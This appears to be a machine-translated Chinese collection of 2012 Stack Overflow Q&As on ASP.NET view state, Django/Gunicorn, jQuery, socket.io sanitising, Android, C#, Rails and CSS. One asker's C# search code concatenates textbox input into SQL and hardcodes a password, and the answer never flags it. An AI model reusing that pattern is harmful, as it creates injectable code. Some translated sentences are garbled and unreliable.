我有一个网站，我想用推荐的 ViewStateUserKey 来保护我的视图状态。

在我的基本页面（显然从 Page 继承）我有这个代码：

```
 protected override void OnInit(EventArgs e)
    {
        base.OnInit(e);

        if (User.Identity.IsAuthenticated)
            base.ViewStateUserKey = Session.SessionID;
    } 
```

在 localhost 上运行良好，但是，当我将其上传到主机（由我们的本地提供商之一提供的共享主机）时，它会在我进行身份验证后给出传统的“视图状态 MAC 验证失败”错误。如果我将此代码注释掉，它会完美运行，所以我 1000% 确定这是原因。

在共享主机上执行视图状态安全的最佳方法是什么？我也已经设置了 ViewStateMac="Enabled"。是否足够或推荐的解决方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T12:50:06.633

从在本地主机上播放而不是在服务器上播放的那一刻起，在我看来，您的会话存在一些问题，并且 sessionID 在您的服务器上快速更改/过期，比身份验证过期更快。

出于这个原因，从用户看到页面到发布页面，会话已过期或在身份验证更改之前发生更改，因此 sessionID 是不同的，因此您会收到此错误。

其他认为你可以看的是你已经设置了`machineKey`web.config。

## 更新

将您的代码与您做出不同的 Scott 进行比较。Scott 使用用户名，根本不会改变，而您使用 sessionid，就像我说的那样可以改变。

对我来说，ether 使用 Scott 建议的，用户名，ether 一些其他不会改变的值，例如用户的 cookie，那就不是那么容易改变。

所以来自 Scott [http://www.hanselman.com/blog/ViewStateUserKeyMakesViewStateMoreTamperresistant.aspx](http://www.hanselman.com/blog/ViewStateUserKeyMakesViewStateMoreTamperresistant.aspx)

```
void Page_Init (Object sender, EventArgs e)
{ 
   if (User.Identity.IsAuthenticated)
      ViewStateUserKey = User.Identity.Name;
} 
```

这就是 scott 检查用户是否经过身份验证的原因，因为它得到了他的名字。如果您使用 sessionid 或用户的 cookie，则无需检查是否已通过身份验证。

现在，如果您使用 cookie 在 vi​​ewstateuserkey 上设置它们，那么对于所有不允许 cookie 的用户，并尝试发布任何帖子都会出错。所以想一个这样的解决方案来处理它们

[https://stackoverflow.com/a/2551810/159270](https://stackoverflow.com/a/2551810/159270)

# python - Django 可以单独在 Gunicorn 上运行（没有 Apache 或 nginx）吗？

> ID：10862259
> 
> 赞同：15
> 
> 时间：2012-06-02T12:16:18.823
> 
> 标签：python, django, nginx, amazon-ec2, gunicorn

我几乎尝试了网络上的每一个 django + nginx 教程，但我无法在屏幕上显示图像文件。这总是老故事 - *404 PAGE NOT FOUND*。网页加载正常，但我的**/static/**文件夹中的 django.png 没有。不确定是 settings.py 还是 nginx 的问题。

我对此感到非常沮丧，以至于我拒绝看另一个“如何获得 nginx/django 教程”。如果我在不久的将来部署一个网站，Gunicorn 是否足以在不使用 Apache 或 nginx 的情况下运行 Django 站点并同时提供静态文件？首先拥有反向代理有很大的好处吗？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-06-02T19:25:40.797

是的。Gunicorn 也可以为您的静态服务。

如果所有其他方法都失败了，让 django 为你做这件事（虽然，这是在挫折之前的最后手段。）为此，你只需要添加另一个 url 模式，如下所示：

```
urlpatterns = patterns('',
    # ... the rest of your URLconf goes here ...
) + static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT) 
```

虽然 django 提供静态服务比根本不提供服务要好，但值得将其委托给针对 nginx 等相同优化的服务器。

我建议在不同的端口上运行 nginx，然后更改 django STATIC_URL 设置以包含该端口（在您确认该端口服务于静态之后）。- 这样做就像从 nginx 文件夹中对 MEDIA_ROOT 进行 simlink 一样简单。

而且，如果您无论如何都在使用 nginx，那么代理所有使用它的请求并且只将 django 请求传递给 gunicorn 也是很好的。所有这些都需要添加一个`conf`相应地告诉 nginx 的文件。

我可以看到它是如何让那些开始并尝试一次完成所有（代理请求、服务静态、配置 nginx）的人感到困惑的。一个一个试试。从独角兽那里获取媒体；然后从 nginx 提供它，然后最终也拥有 nginx 代理。但是，在您将应用程序投入生产之前，请完成所有这些操作。我已经看到这种方法增加了理解并减少了挫败感。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-06-02T13:53:31.820

Gunicorn 文档指出，如果没有代理缓冲慢速客户端，默认工作人员很容易受到拒绝服务攻击： http: [//gunicorn.org/deploy.html](http://gunicorn.org/deploy.html)

> 尽管有许多 HTTP 代理可用，但我们强烈建议您使用 Nginx。如果您选择另一个代理服务器，则需要确保在使用默认 Gunicorn 工作程序时它缓冲慢速客户端。如果没有这种缓冲，Gunicorn 很容易受到拒绝服务攻击。您可以使用 slowloris 检查您的代理是否正常运行。

当使用 gevent 或 tornado 等异步工作器之一时，情况可能并非如此。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-06-02T13:46:17.450

如果您已经在使用亚马逊网络服务，您可以使用 s3 存储桶来托管您的静态内容，并使用 gunicorn（或任何您想要的）将您的应用程序部署到 ec2。这样，您根本不必担心设置自己的静态文件服务器。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2013-07-20T17:01:54.593

我推荐在前面使用 Nginx 有几个原因：

*   当 gunicorn 关闭时，可以轻松实现维护或内部服务器错误页面。这意味着如果您的应用程序服务器未运行，您将始终有一些响应。
*   正如 Gunicorn[文档](http://docs.gunicorn.org/en/stable/deploy.html)所建议的那样，没有检测到诸如 DOS 之类的 http 攻击。
*   您可能希望稍后实施自己的负载平衡策略。随着项目规模的扩大，这对于发布工程来说将变得更加重要。就个人而言，我发现 AWS ELB 有点不可靠，我正在考虑。

**更新**：

另外，请参阅 Gunicorn 开发人员写得很好的答案：

[为什么我需要 Nginx 和 Gunicorn 之类的东西？](https://serverfault.com/a/331263/203559)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-06-11T20:14:03.180

我使用 Werkzeug 中间件制作。不漂亮，也不像使用 nginx 服务器那样高效，但是可以完成这项工作：

在 settings.py 上设置 STATIC_ROOT

```
# project/settings.py
import os
BASE_DIR = os.path.dirname(os.path.dirname(__file__)))
STATIC_ROOT = BASE_DIR+'/static-collected' 
```

比告诉 Werkzeug 提供此文件夹中的文件

```
# project/wsgi.py
import os
BASE_DIR = os.path.dirname(os.path.dirname(__file__))

(...)
from django.core.wsgi import get_wsgi_application
application = get_wsgi_application()
(...)

import os
from werkzeug.wsgi import SharedDataMiddleware
print 'Installing WSGI static files server middleware'
application = SharedDataMiddleware(application, {
    '/static': os.path.join(BASE_DIR, 'static-collected'),
}) 
```

当 DEBUG=True 时，Django 提供文件。当 DEBUG=False 时，Werkzeug 从静态收集的文件夹中提供文件。您需要在使用 DEBUG=False 的服务器上运行 collectstatic 才能使其正常工作。

Obs：出于某种原因，Werkzeug 为未找到的文件给出 500，而不是 404。这很奇怪，但仍然有效。如果您知道原因，请发表评论。

# jquery - 在 asp.net 中从 jQuery 调用启用 AJAX 的 WCF 服务

> ID：10862270
> 
> 赞同：1
> 
> 时间：2012-06-02T12:18:44.830
> 
> 标签：jquery, ajax, wcf

我第一次使用启用 Ajax 的 Wcf 服务尝试测试一个非常基本的功能，

这是我的服务文件**Service.svc**：

```
[ServiceContract(Namespace = "testService")]
[AspNetCompatibilityRequirements(RequirementsMode = AspNetCompatibilityRequirementsMode.Allowed)]
public class Service
{
[OperationContract]
public void DoWork(int id)
{
    return;
}

[OperationContract]
[WebInvoke]
[WebGet]
public string sting(int id) 
{
    string _sting = string.Format("Number is {0}" + id);
    return _sting;
} 
```

}

并尝试使用 jquery 来调用，但这样：

```
 $(function () {
        $.ajax({
            type: "POST",
            url: "Service.svc/sting",
            data: '{"id":"3"}',
            processData: false,
            contentType: "application/json; charset=utf-8",
            dataType: "json",
            success: function () {
                alert("success");
            },
            error: function (msg) {
                $("#errorDiv").text(msg);
            }
        });
    }); 
```

**但我总是得到错误`[object Object]`**

我在做什么错，谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T18:47:34.040

两件事情：

1.  您将 Web 方法定义为 a但 在 Jquery Ajax 方法中将`[WebGet]`其作为请求调用。用类似的东西`POST`替换：`[WebGet]`

    `[WebInvoke(Method = "POST", RequestFormat = WebMessageFormat.Json)]`

2.  我不确定您的 Web.config 中有什么，但您需要确保正确定义了端点行为。

    如果您仍然需要这方面的帮助，如果您可以发布您的 web.config 文件会有所帮助。

# javascript - Socket.io 清理传入数据 (xss)

> ID：10862271
> 
> 赞同：4
> 
> 时间：2012-06-02T12:18:45.013
> 
> 标签：javascript, node.js, express, xss, socket.io

我在 expressjs 3 中使用 socket.io。我想用 express-validator 清理传入的消息。我有这个代码：

```
var expressValidator = require('express-validator')
, sanitize = require('express-validator').sanitize;

socket.on('chat', function (data) {
    io.sockets.in('test').emit('chat', {
            user: sh.session.user,
            message: data.message,
            time: new Date()
    });
}); 
```

我该如何使用`sanitize(data.message).xss`？因为这不起作用。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-06-02T12:41:09.110

在这种情况下，您想使用`validator`而不是`express-validator`. 首先通过 npm 安装它：

```
npm install validator 
```

然后以几乎相同的方式使用它：

```
var sanitize = require('validator').sanitize;

// later on
message = sanitize(data.message).xss() 
```

这样做的原因是因为`express-validator`用于处理通过 expressjs 的 HTTP 请求时。在 Websockets 的情况下，您不会通过 expressjs，而只是在与它相同的端口上侦听。所以 express-validator 在你的 Websocket 数据事件的上下文中实际上并不“存在”。

# android - Android布尔值没有做正确的事情-MediaPlayer在不应该播放时继续播放

> ID：10862276
> 
> 赞同：0
> 
> 时间：2012-06-02T12:19:41.563
> 
> 标签：android, checkbox, menu, boolean, android-mediaplayer

我创建了一个以主 Activity 开头的应用程序。在该主 Activity 上，有 2 个复选框（cbPlayMusic 和 cbPlaySound）。当您通过单击开始按钮开始游戏时，使用以下代码：

```
btStart.setOnClickListener(new OnClickListener() {
        public void onClick(View v) {

            Intent intent = new Intent(GobbleFishMainActivity.this, GobbleFishGame.class);
            intent.putExtra(INTENT_EXTRA_PLAY_MUSIC, cbMusic.isChecked());
            intent.putExtra(INTENT_EXTRA_PLAY_SOUND, cbSound.isChecked());

            startActivity(intent);
        }
    }); 
```

在活动之上是这样的：

```
public static final String INTENT_EXTRA_PLAY_MUSIC = "be.fielibert.gobblefish.extra.PLAY_MUSIC";
public static final String INTENT_EXTRA_PLAY_SOUND = "be.fielibert.gobblefish.extra.PLAY_SOUND"; 
```

然后当你点击开始，GobbleFishGame Activity，这是 onCreate 代码：

```
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    initBitmaps();
    mGraphView = new GraphView(this);
    mPlayMusic = getIntent().getBooleanExtra(GobbleFishMainActivity.INTENT_EXTRA_PLAY_MUSIC,true);
    mPlaySound = getIntent().getBooleanExtra(GobbleFishMainActivity.INTENT_EXTRA_PLAY_SOUND,true);

    setContentView(mGraphView);
    mGraphView.runProgram();
    playMusic();

} 
```

当 mPlayMusic 为 true 时，由于 playMusic() 而创建 GobbleFishGame Activity 时开始播放背景音乐：

```
 private void playMusic(){

    if (!mPlayMusic) {
        return;
    }
    mPlayer = MediaPlayer.create(GobbleFishGame.this, R.raw.song);
    mPlayer.setLooping(true);
    mPlayer.start();
} 
```

到目前为止一切正常。但是，当您按下 Android 设备上的菜单按钮时，会创建一个包含 4 个选项的菜单：主菜单、重新启动游戏、切换音乐、切换声音。这是菜单的代码：

```
 @Override
public boolean onCreateOptionsMenu(Menu menu) {
    super.onCreateOptionsMenu(menu);
    menu.add(Menu.NONE, MENU_MENU, Menu.NONE, "Main menu");
    menu.add(Menu.NONE, MENU_RESTART,   Menu.NONE, "Restart game");
    menu.add(Menu.NONE, MENU_MUSIC,    Menu.NONE, "Toggle music");
    menu.add(Menu.NONE, MENU_SOUND,   Menu.NONE, "Toggle sound");
    return true;
}
@Override
public boolean onMenuOpened(int featureId, Menu menu) {
    mGraphView.pauseGame();
    return super.onMenuOpened(featureId, menu);
}

@Override
public void onOptionsMenuClosed(Menu menu) {
    super.onOptionsMenuClosed(menu);
    if(isStopping=true){
        return;
    }
    else{
        mGraphView.continueGame();
    }

}

@Override
public boolean onOptionsItemSelected(MenuItem item) {
    if (item.getItemId() == MENU_MENU) {
        //mPlayer.release();
        isStopping=true;
        stopMusic();
        mGraphView.mState = STATE_STOP;
        Intent intent = new Intent(GobbleFishGame.this, GobbleFishMainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(intent);
        //finish();
    }
    else if (item.getItemId() == MENU_RESTART) {
        mGraphView.init();
        mPlayer.reset();
        playMusic();
    }
    else if (item.getItemId() == MENU_MUSIC) {
        if (!mPlayMusic) {
            mPlayMusic=true;
            if (mPlayer != null) {
                //mPlayer.start();
                playMusic();
            }
            //playMusic();
        }
        if(mPlayMusic){
            mPlayMusic=false;
            stopMusic();
        }
    }
    else if (item.getItemId() == MENU_SOUND) {
        if (!mPlaySound) {
            mPlaySound=true;
            if (mp != null) {
                mp.reset();
            }
            //mp.reset();
        }
        if(mPlaySound){
            mPlaySound=false;
        }
    }

    return true;
} 
```

但是，切换音乐和切换声音选项将不起作用。这就是发生的情况：当复选框音乐为真时（所以音乐正在播放），如果你然后切换音乐它工作正常。但是，如果您想重新打开音乐，它也可以工作，但是暂停不再起作用。在暂停时，我调用 mPlayer.pause，如果我没有打开或关闭音乐，它就可以正常工作。如果我打开或关闭了音乐，由于某种原因暂停不再起作用。

这是暂停代码：

```
public void pauseGame() {
        if (mMode != MODE_PAUSE) {
            mMode = MODE_PAUSE;
            if (!mPlayMusic) {

                return;
            }
            if (mPlayer != null) {

                mPlayer.pause();

            }

        }
    } 
```

所以这就是我的问题。切换声音也会出现同样的问题：如果我关闭声音，它会起作用并且不再有声音（听起来就像我的鱼吃另一条鱼或游戏结束时的声音），但是当我再次打开声音时，它不起作用: 应该播放的时候没有声音。

我的猜测是它与布尔值有关。我不知道我的代码有什么问题，我做错了什么？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T12:31:58.297

在`MENU_MUSIC`和`MENU_SOUND`处理中，您有以下代码行：

```
if (!mPlayMusic) {
    mPlayMusic=true;
    ... playMusic(); ...
}
if(mPlayMusic) {
    mPlayMusic=false;
    ... stopMusic(); ...
} 
```

由于您忽略了`else`只要第一个`if`条件为真，第二个条件也会被触发（由于第一个条件`mPlayMusic=true;`内的分配），因此音乐在开始后立即停止。

# c# - C# 和“&”运算符与指针转换一起使用

> ID：10862283
> 
> 赞同：1
> 
> 时间：2012-06-02T12:21:02.653
> 
> 标签：c#

为什么 and 运算符在使用时表现不同：

1.  带有无符号整数
2.  当转换为 (uint*) 时，字节数组表示相同的值

    ```
    unsafe
    {
        fixed (byte* i = new byte[4] { 0x02, 0x03, 0x04, 0xFF })
        {
            uint m = 0x020304FF;

            Console.WriteLine("{0:X}",m & 0xFF000000); 

            Console.WriteLine("{0:X}",*(uint*)i & 0xFF000000); 
         }
     } 
    ```

结果是

```
 2000000
     ff000000 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T12:31:40.510

假设一个 32 位[little-endian 系统](http://betterexplained.com/articles/understanding-big-and-little-endian-byte-order/)（与当今绝大多数计算机中的任何 Intel 处理器一样），将字节数组 {02 03 04 FF} 的地址转换为 32 位 int 的地址将导致 int值为 0xFF040302。因此结果。

换句话说，您认为它是“相同值”的假设是不正确的。

# ruby-on-rails - 在 ActiveRecord 中重命名 add_index :name

> ID：10862290
> 
> 赞同：0
> 
> 时间：2012-06-02T12:22:10.437
> 
> 标签：ruby-on-rails, activerecord

我正在做一些重构，所以我将模型重命名`Affiliate`为`User`.

我已经将数据库重命名为，`users`但我看到索引的名称仍然引用附属机构，即`index_affiliates_on_approved`.

```
add_index "users", ["approved"], :name => "index_affiliates_on_approved"
add_index "users", ["confirmation_token"], :name => "index_affiliates_on_confirmation_token", :unique => true
add_index "users", ["email"], :name => "index_affiliates_on_email", :unique => true
add_index "users", ["reset_password_token"], :name => "index_affiliates_on_reset_password_token", :unique => true 
```

我完全不熟悉名称对索引的含义。重命名它们的最佳方法是什么？运行迁移删除索引并在不丢失任何数据的情况下再次创建它们是否安全？

我正在阅读here，但找不到任何对重命名索引名称的引用。 [http://api.rubyonrails.org/classes/ActiveRecord/Migration.html](http://api.rubyonrails.org/classes/ActiveRecord/Migration.html)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T14:05:47.597

您可以删除然后添加索引，而不会丢失任何数据。

# javascript - 创建包含不同元素的可点击标签

> ID：10862303
> 
> 赞同：0
> 
> 时间：2012-06-02T12:24:09.723
> 
> 标签：javascript, html, css

# 可点击 h2 中的元素

## 介绍

我正在用 html 创建一个单行菜单。我有 3 个以非常相似的方式工作的选项。问题是拥有 html 权利的那个看起来更容易失败。我在这里放了3个例子。我正在寻找可靠的、与浏览器兼容的菜单。第三个选项使用 javascript，所以我不太喜欢它。

菜单必须为 100% 宽度，在灰色矩形内，并且必须在左侧有一些文本，在右侧有一些文本。整个菜单必须是可点击的，只有一个超链接。这是[我](http://mattgemmell.com/2008/12/08/what-have-you-tried/)到目前为止所尝试的：

## 实施的例子

查看它们所有工作的链接在[这里](http://newfutureuniversity.org/test/hblock.php)（免责声明：是的，这是我自己的网页）。如果你不想点击那里，这里有一张图片，它们的外观与选项的顺序相同：

![显示 3 个当前备选方案](../Images/e66cb03d5d16facf485c60ad78b9b037.png)

## 选项1。

这个不符合 html 标准，但我发现它更合乎逻辑，它总体上表现得更好，而且不太可能带来很多麻烦：

```
<a href="http://newfutureuniversity.org/test/hblock.php">
  <h2 style="width:100%; height:100%; border: 1px solid #AAA; padding: 0px 0px 0px 5px; background-color: #EEE;">
    Hello world
    <span style="margin: 6px; color:gray; font-size: 15px; float:right; ">
      Right text
    </span>
  </h2>
</a> 
```

## 选项 2。

这个是 html 兼容的，但我只是讨厌使用像素来居中。我觉得它真的很容易坏。此外，右边的文字不是完全可点击的：

```
<h2 style="border: 1px solid #AAA; padding: 0px 0px 0px 5px; background-color: #EEE;">
  <a href="http://newfutureuniversity.org/test/hblock.php" style="width:100%; height:100%; display:block;">
    Hello world
  </a>
  <span style="position: relative; right: 6px; top:-23px; color:gray; font-size: 15px; float:right; ">
    Right text
  </span>
</h2> 
```

## 选项 3。

这个使用javascript。我不喜欢用 javascript 让每个菜单像这个一样膨胀，并且可以使用 html/css，但这是另一种选择。它没有常规链接的颜色。

```
<h2 onclick="location.href='http://newfutureuniversity.org/test/hblock.php';" style="cursor:pointer; display: block; width:100%; height:100%; border: 1px solid #AAA; padding: 0px 0px 0px 5px; background-color: #EEE;">
  Hello world
  <span style="margin: 6px; color:gray; font-size: 15px; float:right; ">
    Right text
  </span>
</h2> 
```

## 问题

**哪一个更兼容浏览器并且不太可能破坏？您还有其他建议或改进吗？任何反馈将不胜感激**

PS，所有的内联 CSS 将被分开放在不同的 CSS 表中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T12:41:05.250

我建议更好的方法是将您的 HTML 重新组织为以下内容：

```
<h2>
    <a href="http://newfutureuniversity.org/test/hblock.php">Hello world<span>Right text</span></a>
</h2>​ 
```

然后使用以下 CSS：

```
a {
    display: block;
    padding: 0.2em;
    width: 80%;
    margin: 0 auto;
    border: 1px solid #000;
    background-color: #aaa;
}

a span {
    color: #000;
    float: right;
    text-decoration: none;
    font-size: 0.8em;
    padding-top: 0.2em;
}​ 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/kazZu/1/)。

不过，其有效性取决于您希望最终放置在`h2`标签中以保持可点击的元素。在 HTML5 下，在标签内嵌套块级元素是有效的`a`，但在 HTML4 下，虽然它似乎仍然有效，但根据文档类型，它被认为是无效的*。*

但是，对于发布的要求，这似乎可行；尽管它确实需要重组您的 HTML，这可能是不可能的。然而：

*   它*是*有效的 HTML，
*   它是抗破坏的（除非内容`span`超过给定的宽度，
*   它不依赖于任意`px`调整（尽管它确实用于`padding`将调整后的文本垂直居中`a`），
*   它不需要 JavaScript

* * *

**编辑**以稍微修改 CSS，以解决右浮动文本变得足够大以溢出到下一行的可能性，只需添加`overflow: hidden`到`a`元素的 CSS：

```
a {
    display: block;
    padding: 0.2em;
    width: 80%;
    margin: 0 auto;
    border: 1px solid #000;
    background-color: #aaa;
    overflow: hidden;
} 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/kazZu/2/)。

当然，您也可以`max-width`在`span`:

```
a span {
    color: #000;
    float: right;
    text-decoration: none;
    font-size: 0.8em;
    padding-top: 0.2em;
    max-width: 80%;
}​ 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/kazZu/3/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T12:50:58.800

我同意大卫托马斯的加价。虽然我会稍微改变 css 以使其更健壮。如果您调整浏览器的大小以使右侧跨度被推到左侧文本下方（使浏览器更小），那么您会看到我应用的清除属性意味着 a 保持围绕跨度而不是允许跨度移出a区。

**HTML：**

```
<h2 class="item ">
    <a href="#" >Loads of left left Left Text<span>Right Text lots more</span></a>
</h2> 
```

**CSS：**

```
.item a {
    zoom:1;
    border: 1px solid #666;
    background: grey;
    display: block;
}
.item a:before,
.item a:after {
    content:"";
    display:table;
}
.item a:after {
    clear:both;
}
.item span {
    background: green;
    float: right;
} 
```

**演示：**

[http://jsfiddle.net/Vc3DA/](http://jsfiddle.net/Vc3DA/)

# c# - 解析查询时出错

> ID：10862305
> 
> 赞同：0
> 
> 时间：2012-06-02T12:24:14.097
> 
> 标签：c#, sql, visual-studio-2010, sql-server-ce

我正在使用 Visual Studio 2010 在 C# 中编写程序，并在从`.sdf`文件中检索数据时出错。

```
private void BasicSearch_button_Click(object sender, EventArgs e)
{
    SqlCeConnection cn = new SqlCeConnection(@"Data Source=" + Path.Combine(Application.StartupPath, "FRAT_DB.sdf") + ";Password=P@ssw0rd;Persist Security Info=False;Max Database Size=256");

    string query = @"SELECT Person.PersonID, Person.Name, PhotoTags.PhotoID, Photo.Path, Photo.Location, Person.Age, Person.P_Group, Person.Email, Photo.Date "+
                    "FROM Person INNER JOIN PhotoTags ON Person.PersonID = PhotoTags.PersonID INNER JOIN "+
                    "PhotoON PhotoTags.PhotoID = Photo.PhotoID "+"WHERE (Person.Name LIKE '%%')";

    if (txtName1.Text.Trim().ToString() == "" || txtName2.Text.Trim().ToString() == "")
    { MessageBox.Show("Enter Both, Name1 and Name2"); return; }
    else if (radioButtonAND.Checked)
    {
        query = @"select pt.PhotoID,Photo.Path,photo.Location, Photo.Date from Person p inner join PhotoTags pt on p.PersonID=pt.PersonID inner join Photo on pt.photoID=photo.photoID where Name like '%" + txtName1.Text + "%' and pt.Photoid in (select pt.PhotoID from Person p inner join PhotoTags pt on p.PersonID=pt.PersonID where Name like '%" + txtName2.Text + "%')";
    }
    else
    {
        query = @"SELECT DISTINCT Person.PersonID, Person.Name, PhotoTags.PhotoID, Photo.Path, Photo.Location, Person.Age, Photo.Date
FROM Person INNER JOIN PhotoTags ON Person.PersonID = PhotoTags.PersonID INNER JOIN
PhotoON PhotoTags.PhotoID = Photo.PhotoID
WHERE (Person.Name LIKE '%%')";
        query += " AND (Person.Name like '%" + txtName1.Text + "%' OR Person.Name like '%" + txtName2.Text + "%')";
     }

     if (cn.State == ConnectionState.Closed) cn.Open();

     SqlCeCommand cm_Search = new SqlCeCommand(query, cn);

     try
     {
         SqlCeDataReader rdr = cm_Search.ExecuteReader();

         List<PersonPhoto> personPhoto = new List<PersonPhoto>();
         List<PersonPhotoWithoutName> personPhotoWithoutName = new List<PersonPhotoWithoutName>();

         bool HasRows = rdr.Read();

         if (HasRows)
         {
            while (rdr.Read())
            {
                if (radioButtonAND.Checked)
                {
                    personPhotoWithoutName.Add(new PersonPhotoWithoutName
                            {
                                PhotoID = Convert.ToInt32(rdr["PhotoID"].ToString()),
                                Location = rdr["location"].ToString(),
                                Date = rdr["Date"] != null ? Convert.ToDateTime(rdr["Date"]) : DateTime.Now,
                                path = rdr["path"].ToString(),
                            });
                }
                else
                {
                    personPhoto.Add(new PersonPhoto
                            {
                                Name = rdr["Name"].ToString(),
                                Location = rdr["location"].ToString(),
                                Date = rdr["Date"] != null ? Convert.ToDateTime(rdr["Date"]) : DateTime.Now,
                                path = rdr["path"].ToString()

                            });
                }
             }
             rdr.Close();
          }
          else
          { MessageBox.Show("No Records Found"); selectedPictureBox.Image = null; rdr.Close(); }

          if (personPhoto.Count > personPhotoWithoutName.Count)
          {
              DataGridPersons.DataSource = personPhoto;
              DataGridPersons.Refresh();
          }
          else
          {
              DataGridPersons.DataSource = personPhotoWithoutName;
              DataGridPersons.Refresh();
          }
      }
      catch (Exception exp)
      {
                throw exp;
      }

      if (cn.State != ConnectionState.Closed) cn.Close();
 } 
```

每当我尝试搜索某人时，都会出现此异常错误：

> 解析查询时出错。[令牌行号= 3，令牌行偏移量= 18，错误令牌= . ]

有什么帮助吗？

提前致谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-02T12:28:14.427

我怀疑这是问题所在：

```
... INNER JOIN
PhotoON PhotoTags.PhotoID = Photo.PhotoID ... 
```

我怀疑你的意思是：

```
... INNER JOIN
Photo ON PhotoTags.PhotoID = Photo.PhotoID ... 
```

注意 和 之间的`Photo`空格`ON`。我怀疑你可以重新格式化你的查询，这样会更清楚，说实话......

# jquery - 如何使用 jquery 在输入文本框上触发模糊/聚焦事件？

> ID：10862308
> 
> 赞同：5
> 
> 时间：2012-06-02T12:24:41.153
> 
> 标签：jquery, events, blur, focusout

我正在使用 1.7.2，我知道这应该可以工作：

```
// cell is a jquery representation of a <td> element
cell.append($("<input/>", { "type": "text" }).val(content));        
cell.children()[0].focus();
cell.children()[0].on("blur", function() {
    alert("blur");
} 
```

附加输入框，获取焦点，然后 javascript 控制台告诉我：

```
Uncaught TypeError: Object #<HTMLInputElement> has no method 'on' 
```

如果有人知道我如何捕捉模糊/聚焦事件，我将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-02T12:28:46.003

您应该绑定委托事件，即。这些输入的实时事件，因为它们稍后附加到 DOM，所以他们需要实时事件处理程序。

```
$(cell).on('blur focusout', ':text', function() {
   alert(this.value);
}); 
```

然后触发如下：

```
$(':input:first', cell).blur(); // or $(':text', cell).trigger('blur');

$(':input:first', cell).focusout(); // or $(':text', cell).trigger('focusout');. 
```

根据你的代码

```
cell.children(':input:eq(0)').focus().on("blur", function() {
    alert("blur");
}; 
```

或者

```
cell.children(':input:first').focus().on("blur", function() {
    alert("blur");
}; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-02T12:29:55.847

您正在访问 DOM 元素，`[0]`并且将其视为 jQuery 对象。

如果只想要第一个，则需要使用`eq()`jQuery 对象来获取。

```
cell.children().eq(0).focus().on("blur", function() {
    alert("blur");
}; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-02T12:31:32.030

你正在调用`.on`一个 DOM 元素，而不是 jQuery 对象，试试这个：

```
var input = $("<input/>", { "type": "text", val: content } );
cell.append(input);
input.focus();
input.on( "blur", function(){
    alert( "blur" );
}); 
```

# c# - Windows 8 Metro 风格应用的图表控件

> ID：10862313
> 
> 赞同：5
> 
> 时间：2012-06-02T12:25:21.333
> 
> 标签：c#, xaml, windows-8, windows-runtime, microsoft-metro

我们有任何可用于 Windows 8 Metro 风格的图表控件吗？在 WP7（.Net 4.0 版）中，我们有 Windows.Form.DataVisualization.dll 来处理图表控件。此 dll 还随附用于 Metro 风格应用程序的 .Net（Net 版本 4.5）。但是从（.Net 版本 4.5 文件夹）引用此 dll 时，它给出了 2 个构建错误，如下所示....

错误 8 无法解析程序集或 Windows 元数据文件 'System.Windows.Forms.dll' E:\MyFolfer\MetroApp\ChartApp\ChartApp.csproj

错误 9 类型 Universe 无法解析程序集：System.Windows.Forms，Version=4.0.0.0，Culture=neutral，PublicKeyToken=b77a5c561934e089。图表应用

任何想法...

注意：首选非付费选项。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-04T18:54:48.903

您可以[使用 HTML5-Javacript 构建 Metro 风格应用程序](http://msdn.microsoft.com/en-us/library/windows/apps/br211385.aspx)，因此您可以使用 GPL 项目[dhtmlx](http://dhtmlx.com/docs/products/dhtmlxChart/index.shtml)

从主页：

> dhtmlxChart 是一个纯 JavaScript 图表库，用于在网页上生成 Ajax 图表

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-02T12:36:22.447

你不能在 WinRT 中做 winforms。这是一个新的 UI 和 API。

据说 Telerik 正在开发一个图表组件。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-03T05:38:18.583

你需要一个互联网连接，但我对谷歌的图像图表 API 有一些运气：[https ://developers.google.com/chart/image/](https://developers.google.com/chart/image/)

该 API 已被弃用，并且在 2015 年 4 月之后将不再工作，但到那时我认为会有许多其他供应商可供选择。

# windows-phone-7 - Windows Phone - 跨页面保留 PhoneApplicationPage 的实例成员

> ID：10862314
> 
> 赞同：0
> 
> 时间：2012-06-02T12:25:49.080
> 
> 标签：windows-phone-7

我在 MainPage.xaml.cs 中有一个 Instance 成员，即在从 PhoneApplicationPage 扩展的 MainPage 类中。当我导航到另一个页面并再次返回时，我希望获得 Instance 成员的值......我如何在 Page 调用中保持不变？只有几页，成员对象类很小

我应该推入PhoneApplicationService吗？并进入国家？

这是最干净，性能最好的方式吗？

第一次在移动开发中......提前感谢:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T15:09:40.077

在一般使用中，Page 实例将保存在 RAM 中——因此您无需执行任何操作。

但是，在墓碑情况下，您的页面实例将从 RAM 中刷新。

要保留值或字符串，最简单的方法是将值保存/加载到 IsolatedStorageSettings - [http://msdn.microsoft.com/en-us/library/system.io.isolatedstorage.isolatedstoragesettings(v=VS .95).aspx](http://msdn.microsoft.com/en-us/library/system.io.isolatedstorage.isolatedstoragesettings(v=VS.95).aspx)

